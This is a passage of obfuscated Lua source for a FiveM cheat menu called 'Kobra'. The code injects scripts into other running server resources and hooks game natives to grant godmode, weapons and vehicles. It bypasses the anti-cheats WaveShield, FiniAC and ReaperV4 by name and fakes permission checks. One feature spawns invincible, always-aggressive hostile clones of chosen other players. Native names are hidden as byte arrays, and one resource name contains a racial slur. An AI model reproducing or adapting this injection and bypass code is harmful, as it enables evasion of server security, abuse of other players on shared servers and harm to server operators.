                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v231));break;end if (v230==(0 -0)) then if ( not v229 or ( #v229==(0 + 0))) then return;end v231=table.concat(v229,",");v230=470 -(304 + 165) ;end end end;v12.HandleGodmodeToggle=function(v232,v233) local v234=0;local v235;local v236;while true do if (v234==(1 + 0)) then if v235 then local v745=0;while true do if ((160 -(54 + 106))==v745) then if v233 then local v1140=1969 -(1618 + 351) ;while true do if ((0 + 0)==v1140) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3000);v48(v236,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",3000);v48(v236,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);end return;end end end if v233 then local v746=1016 -(10 + 1006) ;while true do if (0==v746) then v12:Notify("success","Kobra","Godmode Enabled",3000);MachoInjectResource2(1 + 2 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else local v747=0 + 0 ;while true do if (v747==0) then v12:Notify("error","Kobra","Godmode Disabled",9725 -6725 );MachoInjectResource2(1036 -(912 + 121) ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end break;end if (v234==0) then v235=GetResourceState("WaveShield")=="started" ;v236=((GetResourceState("monitor")=="started") and "monitor") or (v235 and "WaveShield") or "any" ;v234=1 + 0 ;end end end;v12.SpawnSelectedVehicle=function(v237,v238,v239,v240) local v241=0;local v242;local v243;local v244;local v245;local v246;while true do if (v241==(1292 -(1140 + 149))) then if (GetResourceState("solos-rentals")=="started") then local v748=0;while true do if (v748==(0 + 0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",3000);print("Creating Vehicle via Fallback #1");v748=1 -0 ;end if (v748==(1 + 0)) then v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v238,tostring(v240),tostring(v239),v245.x,v245.y,v245.z,v246));break;end end elseif (GetResourceState("amigo")=="started") then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",10267 -7267 );print("Creating Vehicle via Fallback #2");v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v238,tostring(v240),tostring(v239)));elseif v76 then local v1008=0;while true do if (v1008==0) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",5626 -2626 );print("Creating Vehicle via Fallback #3");v1008=1 + 0 ;end if (v1008==(3 -2)) then v48(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v238,tostring(v240),tostring(v239)));break;end end elseif (GetResourceState("qb-core")=="started") then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",3186 -(165 + 21) );print("Creating Vehicle via Fallback #4");v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v238   .. [["

            if ]]   .. tostring(v240)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v239)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v245.x   .. [[, ]]   .. v245.y   .. [[, ]]   .. v245.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v246   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );elseif ((v244:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1336=0;while true do if ((111 -(61 + 50))==v1336) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3000);print("Creating Vehicle via Fallback #5");v1336=1;end if (v1336==(1 + 0)) then v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v238,tostring(v240),tostring(v239)));break;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1401=0 -0 ;while true do if (1==v1401) then v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v238,tostring(v240),tostring(v239)));break;end if (v1401==0) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",6045 -3045 );print("Creating Vehicle via Fallback #6");v1401=1 + 0 ;end end elseif (GetResourceState("lation_laundering")=="started") then local v1461=0;while true do if (v1461==(1461 -(1295 + 165))) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v238,tostring(v239),tostring(v240)));break;end if ((0 + 0)==v1461) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",1207 + 1793 );print("Creating Vehicle via Fallback #7");v1461=1398 -(819 + 578) ;end end else local v1462=1402 -(331 + 1071) ;local v1463;while true do if (v1462==0) then v1463=v75();if v1463 then local v1706=0;while true do if (v1706==(744 -(588 + 155))) then v48(v1463,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v238,tostring(v240),tostring(v239)));break;end if ((1282 -(546 + 736))==v1706) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",4937 -(1834 + 103) );print("Creating Vehicle via Fallback #8");v1706=1;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",3000);if ( not v238 or (v238=="")) then return;end local function v1726(v1737) local v1738=0 + 0 ;local v1739;while true do if (0==v1738) then v1739={};for v1780=1, #v1737 do v1739[v1780]=string.byte(v1737,v1780);end v1738=2 -1 ;end if (v1738==(1767 -(1536 + 230))) then return "{"   .. table.concat(v1739,",")   .. "}" ;end end end local v1727=v1726(v238);local v1728=tostring(v240);local v1729=tostring(v239);local v1730=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1727,v1728,v1729);local v1731,v1732=pcall(MachoInjectResourceRaw,"monitor",v1730);if  not v1731 then end return;end v1462=492 -(128 + 363) ;end if ((1 + 0)==v1462) then if (GetResourceState("lb-phone")=="started") then local v1707=0 -0 ;local v1708;local v1709;while true do if (v1707==(1 + 0)) then v1708,v1709=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v240),v238,tostring(v239),v245.x,v245.y,v245.z,v246));end);if  not v1708 then end break;end if (v1707==(0 -0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",8831 -5831 );print("Creating Vehicle via Fallback #10");v1707=1;end end elseif (GetResourceState("qb-core")=="started") then local v1733=0 -0 ;while true do if ((0 + 0)==v1733) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",3000);print("Creating Vehicle via Fallback #11");v1733=1010 -(615 + 394) ;end if (v1733==1) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v240),GetHashKey(v238),tostring(v239)));break;end end else return;end break;end end end break;end if (v241==(2 + 0)) then v245=GetEntityCoords(v242);v246=GetEntityHeading(v242);v241=3 + 0 ;end if (v241==0) then if ( not v238 or (v238=="")) then return;end v242=PlayerPedId();v241=2 -1 ;end if (v241==(4 -3)) then v243=GetVehiclePedIsIn(v242,false);v244=GetCurrentServerEndpoint();v241=2;end end end;local function v82() local v247=651 -(59 + 592) ;local v248;while true do if (0==v247) then v248={"WaveShield","FiniAC"};for v669,v670 in ipairs(v248) do if (GetResourceState(v670)=="started") then return false;end end v247=2 -1 ;end if (v247==1) then return GetResourceState("ReaperV4")=="started" ;end end end local function v83() local v249=0;local v250;while true do if (v249==(0 -0)) then v250={"ReaperV4","WaveShield"};for v671,v672 in ipairs(v250) do if (GetResourceState(v672)=="started") then return false;end end v249=1;end if (v249==(2 -1)) then return GetResourceState("FiniAC")=="started" ;end end end v12.SpawnSelectedWeapon=function(v251,v252) local v253=0 + 0 ;local v254;local v255;local v256;local v257;local v258;while true do if (v253==2) then v256=PlayerPedId();if ( not v256 or (v256<=(0 -0))) then return;end v253=244 -(123 + 118) ;end if (v253==3) then v257=GetHashKey(v252);if (v257==0) then return;end v253=1 + 3 ;end if (v253==(1 + 0)) then function v254(v673) local v674=1399 -(653 + 746) ;local v675;while true do if (v674==0) then v675={};for v967=1 -0 , #v673 do v675[v967]=string.byte(v673,v967);end v674=1;end if (v674==1) then return table.concat(v675,",");end end end v255=v254(v252);v253=2 -0 ;end if (v253==(0 -0)) then if ( not v252 or (v252=="")) then return;end v254=nil;v253=1 + 0 ;end if (v253==(3 + 1)) then v258=GetResourceState("WaveShield")=="started" ;if v258 then local v749=0 + 0 ;while true do if (v749==(0 + 0)) then v251:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",469 + 2531 );v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
